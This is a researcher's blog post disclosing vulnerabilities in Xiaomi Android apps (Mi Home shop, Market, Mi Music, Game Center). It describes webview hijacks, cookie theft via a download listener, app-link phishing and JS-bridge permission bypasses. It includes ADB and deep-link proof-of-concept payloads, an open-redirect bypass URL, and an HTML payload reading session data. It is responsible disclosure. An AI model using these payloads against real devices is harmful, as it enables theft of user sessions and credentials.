> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.takemyhand.xyz](http://blog.takemyhand.xyz/2021/07/hacking-on-xiaomis-android-apps.html)

> In this blogpost I want to disclose some interesting security issues that I found while researching o......

    

![](https://thehackernews.com/images/-Wbi4tnFAaQE/XKZOF5MuboI/AAAAAAAAzr8/6Qj9LCb7keYTX6v7baa_BjhdCUiv4MijACLcBGAs/s728-e100/xiaomi-antivirus-malware.png)In this blogpost I want to disclose some interesting security issues that I found while researching on Xiaomi's assets, which got me to #5 within a month and also the top researcher spot for April and May'21.  

The app exported an activity which loaded an external URL directly from user input. A simple ADB PoC is **am start -n com.xiaomi.smarthome/com.mi.global.shop.activity.MainTabActivity -d http://tmh/?nativeOpenUrl=www.evil.com**  
As you can see, my payload is in the **nativeOpenUrl** parameter. Looking at the code for this activity, it is found that the webview implements a custom **DownloadListener** like the following:We see that the webview introduces it's own method for whenever a download starts. Further, on lines 23-26, we see that it will attach the user's cookies to a request that makes the app start a download.

Connecting all the dots, we now simply have to create a page that will send a 'downloadable' response to the webview, and it will send a request with the user's cookies attached.  
A simple PoC in PHP:As can be seen, the server responds with a 'downloadable' HTTP response, and on receiving the next request, sends the user cookie to a Collaborator instance.

Naturally, the next step in the attack was to make this attack remote. For this, deep links were used. The manifest file revealed that the app will parse any links of the format **globalshop://mobile.mi.com?<params>.** After some more code review, the following link was crafted: **globalshop://mobile.mi.com?nativeOpenUrl=https://takemyhand.xyz/downloadable_response.html**. This link can be used inside an anchor tag of the attacker's web page, and it will execute the full attack.

This bug is nothing fancy, but I think a lot of people might miss this. The **Xiaomi Market** stored app logs in a public directory, which could have been accessed by any application on the victims' device. This was due to usage of **getExternalFilesDir()**, which returns a handle to the **/sdcard/Android/data/com.xiaomi.market/files** directory where the logs reside. Previously I only restricted myself to checking the **/sdcard/** directory without looking inside the app's own private (but public?) directory. Looking for these issues is as simple as grepping for **getExternalFilesDir()** and not just **getExternalStorage()**. A simple java PoC to steal logs out of the directory is:

The manifest file for Mi Music looked like:

Code for **miui-music://web** deeplink in **com.miui.player.component.HybridUriParser:**

As can be seen, if the deeplink is like **miui-music://web/?url=https://www.google.com&browser_view=true,** this will launch **another** intent with data as _https://www.google.com_ and action **android.intent.action.VIEW**. Naturally, this will be opened in the device's browser. 

An interesting way to attack such implementations (which is quite common to prevent malicious links from opening inside the webview), is to use **app links**.

Android allows use of app links, which work similar to deep links. If an app link for my app exists, instead of the URL opening in the browser, my application will be launched on the user's device.  
So, a custom APK was built, and the following intent filters were added:

This means that all intents with data [https://recon.takemyhand.xyz/deceive.html](https://www.blogger.com/#) will be launched inside my application.  
If I just add this intent filter, then on using deeplink **miui-music://web/?url=https://recon.takemyhand.xyz/deceive.html&browser_view=true**, my app will simply get launched, although **without** any chance of deceiving the user.  
To make it 100% convincing, the following intent filters were also added inside the app:

This will allow the user to choose an application when launching the deeplink **miui-music://web/?url=https://recon.takemyhand.xyz/deceive.html&browser_view=true**. Even when the user clicks on Mi Music in the intent picker, it will launch the custom APK's activity, since an app link is declared in the application.  
Lastly, I have also signed my APK and used the SHA 256 fingerprint to generate my own **assetlinks.json** file on my website, which allows android to open the custom application every time instead of inside the browser.  
Even when the user chooses Mi Music to open the deeplink, he will be taken to the malicious activity. Since the **launchMode** of the activity inside Mi Music is set to **singleTask**, the malicious activity will be launched inside Mi Music app (a task affinity can be set in the malicious application), making it impossible for victim to suspect an attack. This can lead to very easy theft of credentials, as shown below.

[![](https://s9.gifyu.com/images/Screen_Recording_2021-04-21_at_2.46.05_PM.gif)](https://gifyu.com/image/Grlt)

The simple fix was to specify browser package in **com.miui.player.component.HybridUriParser** when launching browser intent.

In the AndroidManifest.xml file you can see the **com.miui.player.ui.MusicBrowserActivity** processes deeplinks:

Looking at the code for **com.miui.player.ui.MusicBrowserActivity** shows a function called **dispatch**:

Uri parseData = parseData(intent); parses the intent and passes it to **parseFragment()** in the last function inside dispatch.  
The code for **parseFragment**:

Now we know what deeplink is needed to trigger the webview with our URL: **miui-music://global_music/?page_type=webview&url=https://www.evil.com**

Now to find a way to escalate this attack, a way had to be discovered to exploit this insecure webview usage.

In **com.xiaomi.music.hybrid.internal.HybridManager** class you can see that javascript interface is getting added:

The javascript interfaces are declared in **com.xiaomi.music.hybrid.internal.JsInterface**. You can see that there are 2 javascript interfaces:

Code for **mManager.invoke()** found in **com.xiaomi.music.hybrid.internal.HybridManager**:

The **HybridFeature lookupFeature = this.mFM.lookupFeature(str);** allows us to call certain features. A list of all these features can be found under **com.miui.player.hybrid.feature** folder.

[![](https://1.bp.blogspot.com/-p0U2Fqcz6Hc/YSh7xjGsxqI/AAAAAAAABtw/H5BFC6S9LFAs59HgZRkm7MuRy6NOsMDdwCLcBGAsYHQ/w601-h1058/Screenshot_2021-04-19_at_8.25.54_PM.png)](https://1.bp.blogspot.com/-p0U2Fqcz6Hc/YSh7xjGsxqI/AAAAAAAABtw/H5BFC6S9LFAs59HgZRkm7MuRy6NOsMDdwCLcBGAsYHQ/s2006/Screenshot_2021-04-19_at_8.25.54_PM.png)

So using our webview, we should able to query any of these features. For example, to get the userInfo, our payload inside the webview will be:

This payload took quite some time to make. The first parameter is an identifier to the feature we want to call, the second parameter is the type of request we are making. In this case, we use the **callback** mode and use our callback as (function(t) {alert(t)} which will take the response from the java code and alert it.

If you try loading the above script inside your HTML page and load it inside your webview, you will get permission error. Why?

  
So in the first line of the invoke function, you can see:

The code for this can be found in the **com.xiaomi.music.hybrid.internal.PermissionManager** class. As you can see, we need a valid _Config_ object: 

A **Config** object is initialised every time the app opens a URL inside the webview. This objects properties include a signature, an array of allowed domains and subdomains, and some other app-specific items. A custom **_Config_** can be declared using the **config()** javascript interface mentioned in the **com.xiaomi.music.hybrid.internal.JsInterface** file. However, this requires a lot of reverse engineering as it involves **generating a valid signature**. Since the object was _huge_ (as you will see in the video), to get a valid **Config** object, we will use Frida, so that we can understand how a **Config** object affects our control over the webview. We will use the following Frida script to capture a valid **Config** object:

As you can see in the youtube video, I am able to get a default valid **Config** object, in which the **firebasestorage.googleapis.com** seems to have been whitelisted as a domain. 

This means that the javascript hosted on the **https://firebasestorage.googleapis.com/*** sites will be able to invoke the invoke interface without any error, since this URL will be present inside the **Config** object on webview init, thereby successfully passing the **isValid()** check. Firebase allows any user to store files (HTML files in this case) on the **firebasestorage.googleapis.com** domain.

1.  Go to [https://console.firebase.google.com/u/0/](https://console.firebase.google.com/u/0/)
2.  Select a project
3.  Click on storage on the left side tab.
4.  Create an HTML file with the following payload and get the resulting URL:

ADB shell: **am start -n com.miui.player/com.miui.player.ui.MusicBrowserActivity -d "miui-music://global_music/?page_type=webview&url=<FIREBASE-URL-HERE>"**  

After running the above command, we are successfully able to bypass the permissions and invoke any JS interface remotely.

Basically, all the features (com.miui.player.hybrid.feature.*) in the attached screenshot can now be queried by the attacker

Display android toast:
----------------------

This will make an Android toast on victim's device:

Get user search history:
------------------------

Query current playing song:
---------------------------

Lastly, other music and device related information can be queried in a similar way using the com.miui.player.hybrid.feature.ConfigStatics class and also all the other query features.

The type parameter in the above payload can be adjusted according to the numbers mentioned in com.miui.player.hybrid.feature.ConfigStatics class.

Attacker can also remotely **control music** (play, seek, next, previous) using **com.miui.player.hybrid.feature.ControlService** and **get all JOOX account information** using **com.miui.player.hybrid.feature.JooxBridgeFeature**.

This bug exists in the Xiaomi game center which I have downloaded from [https://game.xiaomi.com.](https://game.xiaomi.com./) I have found an interesting webview hijack which bypasses the whitelist protection in place. Activity **com.xiaomi.gamecenter.ui.webkit.KnightsWebKitActivity** is exported and accepts deeplinks of the format **migamecenter://openurl**:

1<activity android:theme="@style/Theme.Light" android:> 2 <intent-filter> 3 <action android:/> 4 <category android:/> 5 <category android:/> 6 <data android:scheme="migamecenter" android:host="openurl"/> 7 </intent-filter>

Looking at the following function which is called inside the onCreate() inside the activity's code:

1private boolean c(Intent intent) { 2 Uri data; 3 **<--redacted-->** 4 if (TextUtils.isEmpty(this.Y) && (data = intent.getData()) != null) { 5 String scheme = data.getScheme(); 6 String host = data.getHost(); 7 if (TextUtils.equals(scheme, "migamecenter")) { 8 if (TextUtils.equals(host, fa)) { 9 this.Y = data.toString().substring(23); 10 } else if (TextUtils.equals(host, ga)) { 11 this.qa = false; 12 this.Y = data.toString().substring(26); 13 } else { 14 this.Y = data.toString(); 15 } 16 } else if (Va.b(data, fa)) { 17 String uri = data.toString(); 18 this.Y = uri.substring((scheme + "://").length() + 15 + 12); 19 } else { 20 this.Y = data.toString(); 21 } 22 } 23 Logger.b("KnightsWebKitActivity", "openurl=" + this.Y); 24 Uri uri2 = null; 25 if (!TextUtils.isEmpty(this.Y)) { 26 uri2 = Uri.parse(this.Y); 27 } 28 if (!G(this.Y)) { //VALIDATION OF URL HAPPENING HERE 29 Log.e("knightsweb", "DENY ACCESS!!! Unsupported url."); 30 return false; 31 } 32 **<--redacted-->** 33 } 34 a(uri2, intent); 35 } 36 return true; 37 }

At this point, we can try simply loading migamecenter://openurl?www.evil.com and hope that the following line inside the onCreate() function will simply load www.evil.com in our webview:

1this.ka = new KnightsWebView(this, this, this.na, this.Y);

We observe that this fails. Digging deeper, the above function `c` calls `if (!G(this.Y))` which validates that the URL is owned by Xiaomi or related companies. The following function is in com.xiaomi.gamecenter.ui.webkit.Z:

1public boolean b(String str) { 2 if (h.f11484a) { 3 h.a(133205, new Object[]{str}); 4 } 5 if (TextUtils.isEmpty(str)) { 6 return false; 7 } 8 String trim = str.trim(); 9 if (TextUtils.isEmpty(trim)) { 10 return false; 11 } 12 if (d(trim)) { 13 return true; 14 } 15 try { 16 Uri parse = Uri.parse(trim); 17 String host = parse.getHost(); 18 if (TextUtils.isEmpty(host)) { 19 return false; 20 } 21 Logger.b("webkit host=" + host); 22 if (host.endsWith(".mi.com") || host.endsWith(".xiaomi.com") || host.endsWith(".wali.com") || host.endsWith(".xiaomi.net") || host.endsWith(".duokan.com") || host.endsWith(".miui.com") || host.endsWith(".mipay.com") || host.endsWith(".duokanbox.com") || TextUtils.equals(host, "mi.com") || TextUtils.equals(host, "xiaomi.com") || host.endsWith(".gov.cn") || host.endsWith("jq.qq.com")) { 23 return Va.b(parse.getScheme()); 24 } 25 return false; 26 } catch (Throwable th) { 27 Logger.a("", th); 28 } 29 }

As you can see, this protection looks robust. The application checks whether the URL to be loaded ends with mi.com, xiaomi.com, duokan.com etc.

The KnightsWebView actually sets its WebViewClient to BaseWebViewClient. Looking at the code for this, we come across the shouldOverrideUrlLoading implementation:

1public boolean shouldOverrideUrlLoading(WebView webView, String str) { 2 BaseWebView baseWebView2; 3 <--redacted--> 4 if (isJavaScripUrl(str)) { 5 this.mBridgeHandler.sendMessage(this.mBridgeHandler.obtainMessage(256, webView)); 6 return true; 7 } 8 <--redacted--> 9 } else { 10 if (str.startsWith("migamecenter://")) { 11 try { 12 Intent intent = new Intent("android.intent.action.VIEW"); 13 intent.setData(Uri.parse(str)); 14 intent.putExtra("extra_title", m._b); 15 Aa.a(webView.getContext(), intent); 16 } catch (Exception e2) { 17 Log.w("", e2); 18 } 19 return true; 20 } 21 boolean e3 = Y.e(str); 22 if (!e3) { 23 k.b(R.string.unsupported_url_tip); 24 } 25 return e3; 26 } 27 } 28 }

Since we are trying to load www.evil.com in our webview, our URL will fall to the last statement:

2 if (!e3) { 3 k.b(R.string.unsupported_url_tip); 4 } 5 return e3;

`Y.e()` returns true if the URL is owned by Xiaomi (.mi.com, _.xiaomi.com_ etc.) and has the HTTPS scheme. Since our URL is https://www.evil.com, it will return FALSE. Unfortunately, inside the WebView's shouldOverrideUrlLoading method, returning FALSE means that webview will continue to load the URL, and returning TRUE means the webview will NOT load that URL. Due to this confusion, https://www.evil.com will actually get loaded in the webview. This means, if we are able to find an open redirect on any of the allowed hosts, the webview will NOT BLOCK the redirected URL. I will be using the following open redirect with a simple bypass: **https://api.music.xiaomi.com/web?url=http://www.evil.com\www.xiaomi.com** (fixed now)

Game Center implements JS in a very creative (at least in my experience) way and does not use only JavaScript interfaces. It uses a combination of shouldOverrideUrlLoading and a custom android Handler.

For example, if JS in a page calls JsBridge.invoke("method-name"), the application will load an iframe with source javascript:`<JS-CODE>`. This will trigger the shouldOverrideUrlLoading behaviour and call the custom handler:

1 if (isJavaScripUrl(str)) { 2 this.mBridgeHandler.sendMessage(this.mBridgeHandler.obtainMessage(256, webView)); 3 return true; 4 } else if (str.startsWith(JS_MESSAGE_PREFIX)) { 5 Message obtainMessage = this.mBridgeHandler.obtainMessage(257, webView); 6 obtainMessage.getData().putString("url", str.substring(str.indexOf(JS_MESSAGE_PREFIX) + 50)); 7 this.mBridgeHandler.sendMessage(obtainMessage); 8 return true; 9 }

The mentioned handler will look for that java method inside the com.xiaomi.gamecenter.ui.webkit.BaseWebViewClient class, and then **invoke()** it, as you can see here:

[![](https://lh3.googleusercontent.com/-MJ12D3pgeLM/YSr5x91BtWI/AAAAAAAABuI/AbsqvMn4BTAJFNkYPMjHdMQ9dLFyH70nQCLcBGAsYHQ/s16000/Screenshot%2B2021-08-29%2Bat%2B8.36.07%2BAM.png)](https://lh3.googleusercontent.com/-MJ12D3pgeLM/YSr5x91BtWI/AAAAAAAABuI/AbsqvMn4BTAJFNkYPMjHdMQ9dLFyH70nQCLcBGAsYHQ/Screenshot%2B2021-08-29%2Bat%2B8.36.07%2BAM.png)

This looks very interesting. Since we are using the **getMethod()** java method (The **_java.lang.Class.getMethod()_** returns a **Method** object that reflects the specified **public** member method of the class or interface represented by the **Class** object), all the methods which are declared as public inside this class can be called in this way by using the above function. Some of these functions include:

*   public void get_session_data() this method returns all session data in a JSON object:

[![](https://lh3.googleusercontent.com/-lGjrXmOr95E/YSr2aAhFArI/AAAAAAAABuA/bVd5C9ZH1TIgvMiZPqv0KGUglKltLtSKgCLcBGAsYHQ/s16000/Screenshot%2B2021-08-29%2Bat%2B8.22.12%2BAM.png)](https://lh3.googleusercontent.com/-lGjrXmOr95E/YSr2aAhFArI/AAAAAAAABuA/bVd5C9ZH1TIgvMiZPqv0KGUglKltLtSKgCLcBGAsYHQ/Screenshot%2B2021-08-29%2Bat%2B8.22.12%2BAM.png)

*   public void client_method_execute() this method executes various other methods which include READ/WRITE ACCESS TO ANDROID CALENDAR without permission prompt

So now I have a fair idea of how I can interact with the Java code using javascript inside my webview, but I still don't know _how_ I can do this. To be sure, I can try to read the entire code and work my way backwards to come up with a proper payload, but I instead resorted to further recon inside the android app. Many times, I have found that the application will host some of its webview resources inside the **resources** directory, which can allow an attacker to read the code and figure out how a locally hosted webview file might interact with the application.

In this case, I was able to extract some very valuable information from resources > assets > js > jsBridge-mix.js which contained a lot of code involving native webview to Java interaction. You can find the JS [here](https://gist.github.com/t4kemyh4nd/12603f7b7e1261d505c786cdef049b6f), to see what I was dealing with. After understanding the code, I figured out a lot of function calls and what their purpose is. Looking for the get_session_data() from above also showed how a call looks like:

[![](https://lh3.googleusercontent.com/-noiW9UX23Es/YSrxwYiKudI/AAAAAAAABt4/4eoH2HfAMGESzZ-sHhMzXsvnu799-UIRwCLcBGAsYHQ/s16000/Screenshot%2B2021-08-29%2Bat%2B8.02.26%2BAM.png)](https://lh3.googleusercontent.com/-noiW9UX23Es/YSrxwYiKudI/AAAAAAAABt4/4eoH2HfAMGESzZ-sHhMzXsvnu799-UIRwCLcBGAsYHQ/Screenshot%2B2021-08-29%2Bat%2B8.02.26%2BAM.png)

The **s()** function is basically a modified call to invoke the JS bridge. So now we can build the following payload which will alert the user's session data to us:

```
<html>
  <body>
    <script src='remote-server/jsBridge-mix.js'> //host the jsBridge-mix.js from resources directory
      JsBridge.invoke("get_session_data", {}, function(a) { //the a variable will contain the response JSON object from the Java code
                        var i = {};
                        i = a;
                        window.alert(JSON.stringify(i);
                    })
    </script>
  </body>
</html>


```

Making this attack remote is as easy as using a deeplink in your HTML page and having a user click on it. 

<a href='migamecenter://openurl?**https://api.music.xiaomi.com/web?url=http://www.evil.com\www.xiaomi.com>** with the above HTML payload hosted inside.

Similarly, I can read the rest of the code and also reverse engineer a payload to execute any method that I want to, like the client_method_execute().

That's all for part 1. I will release more of my findings once Xiaomi fixes them. Thanks for reading :)